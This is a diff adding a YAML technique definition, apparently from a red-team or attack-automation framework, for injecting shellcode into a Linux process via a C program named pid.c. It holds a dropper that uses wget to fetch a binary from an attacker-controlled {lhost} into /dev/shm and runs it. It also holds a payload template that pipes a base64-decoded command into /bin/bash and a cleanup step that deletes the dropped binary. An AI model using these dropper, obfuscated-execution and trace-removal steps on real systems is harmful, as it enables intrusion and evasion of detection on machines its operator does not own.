@@ -1,0 +1,24 @@
+id: 2
+name: pid.c
+description: Simple process to get injected using C
+technique_name: Process to get inyected Shellcode into Pid process
+technique_id: LAE02
+target_os: linux
+executer: bash
+lang: c
+binary: pid
+path_src: sessions/c
+output_path: sessions
+target_path: /dev/shm/
+pid: ""
+param: ""
+encoder: base64
+shellcode: ""
+replace_command: ""
+copy_command: cp {path_src}/{name} {output_path}/{name}
+compile: gcc -o {output_path}/{binary} {path_src}/{name}
+droper: wget -O {target_path}{binary} http://{lhost}/{binary}
+command: cd {target_path} ; ./{binary} | tee {target_path}/output_{name}.txt
+payload: /bin/echo '{base64_command}' | /bin/base64 -d | /bin/bash
+clean_cmd: rm {target_path}{binary} -rf
+sleep: 1
